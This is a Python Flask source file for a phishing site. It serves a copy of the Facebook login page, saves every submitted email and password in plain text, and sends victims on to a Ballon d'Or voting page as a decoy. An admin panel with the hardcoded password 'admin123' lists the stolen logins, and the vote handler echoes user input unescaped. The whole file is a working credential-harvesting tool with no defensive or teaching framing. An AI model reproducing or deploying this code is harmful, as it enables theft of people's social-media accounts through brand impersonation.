from flask import Flask, request, render_template_string, redirect

app = Flask(__name__)

# --- Facebook-style Login Page ---
form_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Facebook – log in or sign up</title>
  <style>
    body {
      margin: 0;
      background-color: #f0f2f5;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    .admin-link {
      position: fixed;
      top: 10px;
      right: 10px;
      font-weight: bold;
      color: #1877f2;
      text-decoration: none;
    }
    .container {
      max-width: 900px;
      margin: 60px auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .left h1 {
      font-size: 56px;
      color: #1877f2;
      margin-bottom: 20px;
    }
    .left p {
      font-size: 24px;
    }
    .form-box {
      background: #fff;
      padding: 20px 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 320px;
    }
    input[type="text"], input[type="password"] {
      width: 100%;
      padding: 12px;
      margin-bottom: 10px;
      border-radius: 6px;
      border: 1px solid #ccc;
      font-size: 16px;
    }
    button {
      width: 100%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }
    button:hover {
      background-color: #155ecb;
    }
    .footer {
      text-align: center;
      margin-top: 15px;
      font-size: 14px;
    }
  </style>
</head>
<body>
  <a class="admin-link" href="/admin_login">Admin Login</a>
  <div class="container">
    <div class="left">
      <h1>facebook</h1>
      <p>Connect with friends and the world around you on Facebook.</p>
    </div>
    <div class="form-box">
      <form method="POST" action="/submit">
        <input type="text" name="email" placeholder="Email or phone number" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Log In</button>
      </form>
      <div class="footer">
        <p><a href="#">Forgotten password?</a></p>
        <p><a href="#">Create new account</a></p>
      </div>
    </div>
  </div>
</body>
</html>
'''

# --- Voting Page ---
voting_html = '''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Ballon d'Or Voting</title>
  <style>
    body {
      background: #f2f2f2;
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      padding: 50px;
    }
    h1 {
      color: #333;
    }
    .players {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      gap: 20px;
      margin-top: 30px;
    }
    .player {
      background: #fff;
      border-radius: 10px;
      padding: 20px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      width: 200px;
      transition: 0.3s;
    }
    .player:hover {
      transform: scale(1.05);
    }
    .player img {
      width: 100%;
      border-radius: 10px;
    }
    .player button {
      margin-top: 10px;
      padding: 10px;
      width: 100%;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 5px;
      font-size: 16px;
      cursor: pointer;
    }
    .player button:hover {
      background-color: #155ecb;
    }
  </style>
</head>
<body>
  <h1>Vote Your Favorite Player for Ballon d'Or 2025</h1>
  <div class="players">
    {% for player in players %}
    <div class="player">
      <img src="{{ player.image }}" alt="{{ player.name }}">
      <h3>{{ player.name }}</h3>
      <form method="POST" action="/vote">
        <input type="hidden" name="player" value="{{ player.name }}">
        <button type="submit">Vote</button>
      </form>
    </div>
    {% endfor %}
  </div>
</body>
</html>
'''

# --- Admin Login Page ---
admin_login_html = '''
<!DOCTYPE html>
<html>
<head>
  <title>Admin Login</title>
</head>
<body>
  <h2>Admin Login</h2>
  <form method="POST" action="/admin_login">
    <input type="text" name="admin_user" placeholder="Username" required><br><br>
    <input type="password" name="admin_pass" placeholder="Password" required><br><br>
    <button type="submit">Login</button>
  </form>
</body>
</html>
'''

# --- Player List ---
players = [
    {"name": "Lionel Messi", "image": "https://upload.wikimedia.org/wikipedia/commons/8/89/Lionel_Messi_20180626.jpg"},
    {"name": "Cristiano Ronaldo", "image": "https://upload.wikimedia.org/wikipedia/commons/8/8c/Cristiano_Ronaldo_2018.jpg"},
    {"name": "Kylian Mbappé", "image": "https://upload.wikimedia.org/wikipedia/commons/2/2e/Kylian_Mbapp%C3%A9_2019.jpg"},
    {"name": "Erling Haaland", "image": "https://upload.wikimedia.org/wikipedia/commons/5/59/Erling_Haaland_2023.jpg"},
]

# --- Routes ---
@app.route('/')
def index():
    return render_template_string(form_html)

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form.get('email')
    password = request.form.get('password')
    with open('userdata.txt', 'a') as f:
        f.write(f'Email: {email}, Password: {password}\n')
    return render_template_string(voting_html, players=players)

@app.route('/vote', methods=['POST'])
def vote():
    player = request.form.get('player')
    with open('votes.txt', 'a') as f:
        f.write(f'{player}\n')
    return f'''
    <h2>Thank you for voting for {player}!</h2>
    <a href="/">Back to Login</a>
    '''

@app.route('/admin_login', methods=['GET', 'POST'])
def admin_login():
    if request.method == 'POST':
        user = request.form.get('admin_user')
        pw = request.form.get('admin_pass')
        if user == 'admin' and pw == 'admin123':
            with open('userdata.txt', 'r') as f1, open('votes.txt', 'r') as f2:
                users = f1.read()
                votes = f2.read()
            return f'''
            <h2>Admin Panel</h2>
            <h3>Logins:</h3><pre>{users}</pre>
            <h3>Votes:</h3><pre>{votes}</pre>
            <a href="/">Back to Login</a>
            '''
        else:
            return "<h3>Wrong credentials</h3><a href='/admin_login'>Try again</a>"
    return render_template_string(admin_login_html)

if __name__ == '__main__':
    app.run(debug=True)
